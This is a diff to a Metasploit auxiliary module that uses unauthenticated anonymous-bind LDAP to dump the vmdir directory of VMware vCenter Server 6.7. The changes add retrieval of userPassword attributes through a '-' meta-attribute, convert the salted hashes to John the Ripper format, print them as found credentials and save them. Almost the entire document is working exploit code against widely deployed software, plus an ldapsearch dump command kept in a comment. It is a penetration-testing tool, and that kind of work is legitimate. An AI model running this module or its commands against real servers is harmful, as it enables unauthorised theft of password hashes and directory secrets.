@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/hashes/identify'
+
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::LDAP
@@ -16,10 +18,11 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           This module uses an anonymous-bind LDAP connection to dump data from
           the vmdir service in VMware vCenter Server version 6.7 prior to the
-          6.7U3f update.
+          6.7U3f update, only if upgraded from a previous release line, such as
+          6.0 or 6.5.
         },
         'Author' => [
-          # Discovered by unknown researcher(s)
+          'Hynek Petrak', # Discovery, hash dumping
           'wvu' # Module
         ],
         'References' => [
@@ -29,9 +32,12 @@ class MetasploitModule < Msf::Auxiliary
         'DisclosureDate' => '2020-04-09', # Vendor advisory
         'License' => MSF_LICENSE,
         'Actions' => [
-          ['Dump', 'Description' => 'Dump all LDAP data']
+          ['Dump', { 'Description' => 'Dump all LDAP data' }]
         ],
         'DefaultAction' => 'Dump',
+        'DefaultOptions' => {
+          'SSL' => true
+        },
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS]
@@ -40,11 +46,8 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
+      Opt::RPORT(636), # SSL/TLS
       OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it'])
-    ])
-
-    register_advanced_options([
-      OptFloat.new('ConnectTimeout', [false, 'Timeout for LDAP connect', 10.0])
     ])
   end
 
@@ -62,17 +65,11 @@ class MetasploitModule < Msf::Auxiliary
   #   ldapsearch -xb "" -s base -H ldap://[redacted]
   #
   # Dump data using discovered base DN:
-  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted]
+  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted] \* + -
   def run
-    opts = {
-      host: rhost,
-      port: rport,
-      connect_timeout: datastore['ConnectTimeout']
-    }
-
     entries = nil
 
-    Net::LDAP.open(opts) do |ldap|
+    ldap_connect do |ldap|
       if (@base_dn = datastore['BASE_DN'])
         print_status("User-specified base DN: #{base_dn}")
       else
@@ -84,7 +81,10 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       print_status("Dumping LDAP data from vmdir service at #{peer}")
-      entries = ldap.search(base: base_dn)
+
+      # A "-" meta-attribute will dump userPassword (hat tip Hynek)
+      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/ldap-head/result.c#L647-L654
+      entries = ldap.search(base: base_dn, attributes: %w[* + -])
     end
 
     # Look for an entry with a non-empty vmwSTSPrivateKey attribute
@@ -105,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def pillage(entries)
     # TODO: Make this more efficient?
-    ldif = entries.map(&:to_ldif).join("\n")
+    ldif = entries.map(&:to_ldif).map { |s| s.force_encoding('utf-8') }.join("\n")
 
     print_status('Storing LDAP data in loot')
 
@@ -125,11 +125,65 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("Saved LDAP data to #{ldif_filename}")
 
-    policy = entries.find { |entry| entry.dn == policy_dn }
-
-    if policy
+    if (policy = entries.find { |entry| entry.dn == policy_dn })
       print_status('Password and lockout policy:')
-      print_line(policy.to_ldif)
+      print_line(policy.to_ldif[/^vmwpassword.*/m])
+    end
+
+    # Process entries with a non-empty userPassword attribute
+    process_hashes(entries.select { |entry| entry[:userpassword].any? })
+  end
+
+  def process_hashes(entries)
+    if entries.empty?
+      print_status('No password hashes found')
+      return
+    end
+
+    service_details = {
+      workspace_id: myworkspace_id,
+      module_fullname: fullname,
+      origin_type: :service,
+      address: rhost,
+      port: rport,
+      protocol: 'tcp',
+      service_name: 'vmdir/ldap'
+    }
+
+    entries.each do |entry|
+      # This is the "username"
+      dn = entry.dn
+
+      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/middle-layer/password.c#L32-L76
+      type, hash, salt = entry[:userpassword].first.unpack('CH128H32')
+
+      case type
+      when 1
+        unless hash.length == 128
+          vprint_error("Type #{type} hash length is not 128 digits (#{dn})")
+          next
+        end
+
+        unless salt.length == 32
+          vprint_error("Type #{type} salt length is not 32 digits (#{dn})")
+          next
+        end
+
+        # https://github.com/magnumripper/JohnTheRipper/blob/2778d2e9df4aa852d0bc4bfbb7b7f3dde2935b0c/doc/DYNAMIC#L197
+        john_hash = "$dynamic_82$#{hash}$HEX$#{salt}"
+      else
+        vprint_error("Hash type #{type.inspect} is not supported yet (#{dn})")
+        next
+      end
+
+      print_good("Credentials found: #{dn}:#{john_hash}")
+
+      create_credential(service_details.merge(
+        username: dn,
+        private_data: john_hash,
+        private_type: :nonreplayable_hash,
+        jtr_format: identify_hash(john_hash)
+      ))
     end
   end
 
